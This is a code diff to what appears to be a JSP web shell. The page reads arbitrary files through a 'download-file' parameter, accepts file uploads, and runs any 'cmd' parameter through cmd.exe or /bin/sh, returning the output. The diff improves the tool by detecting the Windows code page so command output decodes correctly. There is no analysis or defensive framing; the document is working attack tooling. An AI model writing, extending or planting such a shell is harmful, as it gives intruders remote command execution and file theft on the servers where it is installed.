@@ -10,6 +10,7 @@
         response.setStatus(404);
         return;
     }
+
     String downloadFile = request.getParameter("download-file");
     String downloadMsg = "";
     if(downloadFile != null && !downloadFile.trim().equals("")) {
@@ -28,6 +29,7 @@
             downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
         }
     }
+
     String uploadMsg = "";
     String contentType = request.getHeader("Content-Type");
     if(contentType != null && contentType.startsWith("multipart/form-data")) {
@@ -86,16 +88,26 @@
         }
         sis.close();
     }
+
     String shell = null;
     String shellOpt = null;
     String cmd = request.getParameter("cmd");
     Integer exitCode = null;
     StringBuilder stdout = new StringBuilder("");
     if(request.getMethod().equals("POST") && cmd != null && !cmd.trim().equals("")) {
+        String codepage = (String) request.getSession().getAttribute("cmd_codepage");
         String osName = System.getProperty("os.name").toLowerCase();
         if(osName.contains("windows")) {
             shell = "cmd.exe";
             shellOpt = "/c";
+            if(codepage == null) {
+                Process p = new ProcessBuilder(shell, shellOpt, "chcp").start();
+                BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                Matcher m = Pattern.compile("\\s(\\d+)\\.").matcher(stdoutReader.readLine());
+                m.find();
+                codepage = m.group(1);
+                request.getSession().setAttribute("cmd_codepage", codepage);
+            }
         } else {
             shell = "/bin/sh";
             shellOpt = "-c";
@@ -103,7 +115,13 @@
         ProcessBuilder pb = new ProcessBuilder(shell, shellOpt, cmd);
         pb.redirectErrorStream(true);
         Process p = pb.start();
-        BufferedReader stdoutReader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+        InputStreamReader isr;
+        if(codepage == null) {
+            isr = new InputStreamReader(p.getInputStream());
+        } else {
+            isr = new InputStreamReader(p.getInputStream(), codepage);
+        }
+        BufferedReader stdoutReader = new BufferedReader(isr);
         String s;
         while((s = stdoutReader.readLine()) != null) {
             stdout.append(s).append(System.getProperty("line.separator"));
